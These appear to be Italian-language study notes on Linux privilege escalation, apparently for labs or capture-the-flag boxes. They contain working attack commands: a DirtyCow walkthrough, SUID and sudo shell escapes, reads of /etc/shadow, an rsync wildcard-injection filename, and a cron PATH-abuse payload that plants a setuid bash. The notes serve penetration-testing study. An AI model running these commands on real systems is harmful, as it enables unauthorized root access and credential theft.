# linpeas.sh

>[!important]- LinPEAS
>Linux Privilege Escalatopm Awesome Script

# Kernel Exploits: Enumerate Distribution
```sh
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release #Debian-based
cat /etc/redhat-release #Redhat-based
```
![[Pasted image 20240520143425.png|center|500]]
## Kernel Esploits: Enumerate Kernel
```sh
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinux-
```
![[Pasted image 20240520144413.png|center|600]]
## Kernel Exploits
Gli exploit del kernel sono programmi che sfruttano le vulnerabilità del kernel per eseguire codice arbitrario con autorizzazioni elevate.
In molti casi, passare al root su un sistema Linux è semplice come scaricare un exploit del kernel nel file system di destinazione, compilare l'exploit e quindi eseguirlo.
Il modo più semplice per difendersi dagli exploit del kernel è mantenere il kernel patchato e aggiornato.
### Esempio: Dirty Cow

![[Pasted image 20240520144627.png|center|600]]
`$ whoami` - ci dice che l'utente corrente è john (utente non root)
`$ uname -a` - ci fornisce la versione del kernel che sappiamo essere vulnerabile a dirtycow
- scaricato l'exploit DirtyCow da qui - https://www.exploit-db.com/exploits/40839/
- compilato ed eseguito. Sostituisce l'utente "root" con un nuovo utente "rash" modificando il file /etc/passwd.
`$ su rash` - Cambia l'utente correntemente connesso in "rash" che è root.
## Search for exploits
![[Pasted image 20240521143322.png|center|550]]
### Non usare come prima scelta
Tuttavia, è molto allettante eseguire semplicemente un exploit e ottenere l'accesso come root, ma dovresti sempre mantenerlo come ultima opzione.
1. L'host remoto potrebbe bloccarsi poiché molti degli exploit root disponibili pubblicamente non sono molto stabili.
2. Potresti ottenere il root e quindi mandare in crash il box.
3. L'exploit potrebbe lasciare tracce/registri che potrebbero farti catturare.
Dovresti sempre provare le altre tecniche per ottenere il root di cui abbiamo discusso di seguito prima di passare direttamente all'esecuzione di un exploit di root locale.
## Servizi eseguiti come root: privilegi dei servizi
```sh
ps aux
ps -ef
top
cat /etc/services
ps aux | grep root
ps -ef | grep root
```

![[Pasted image 20240521143534.png|center|600]]

### Servizi di root: Applicazioni installate
```sh
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/<package manager>/archives
```

![[Pasted image 20240521143842.png|center|600]]
#### Misconfigurazioni
```sh
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk "$1 ~ /^.*r.*/
```
### Esempio: MySQL UDF
## Binari Suid
`find / -perm -4000 2>/dev/null`
![[Pasted image 20240521144157.png|center|600]]
### Esempio
```sh
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
./strings /etc/shadow
```
#### Comandi Sudo

`sudo -l`
User demo may run the following commands on crashlab:
`(root) NOPASSWD: /usr/bin/vim`
`sudo vim -c '!sh'`
User waldo may run the following commands on admirer:
`(ALL) SETENV: /opt/scripts/admin_tasks.sh`
`sudo PYTHONPATH=/dev/shm/opt/scripts/admin_tasks.sh`
User `hacker10` may run the following commands on admirer:
`hacker10 ALL= (root) /bin/less /var/log/*`
` sudo less /var/log/../../etc/shadow #Read shadow`
` sudo less /var/log/something /etc/shadow #Read 2 files`
## Cronjobs
```sh
crontab -l
ls -la /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab/var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cronjobs : wildcards
`rsync -a *.sh rsync://host.back/src/rbd`
Possiamo creare un file chiamato "`-e sh myscript.sh`" così lo script eseguirà il nostro script
**Se la wildcard è preceduta da `/some/path/*` allora non è vulnerabile**.
### Abuso dei PATH
Se puoi controllare qualcosa nella radice $PATH hai molto potere
Esempio con cronjob:
`* * * * root script.sh`
Il percorso è:
`PATH=/home/utente:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
Sfrutta con:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/utente/script.sh`
`/tmp/bash -p`
# Pivoting
25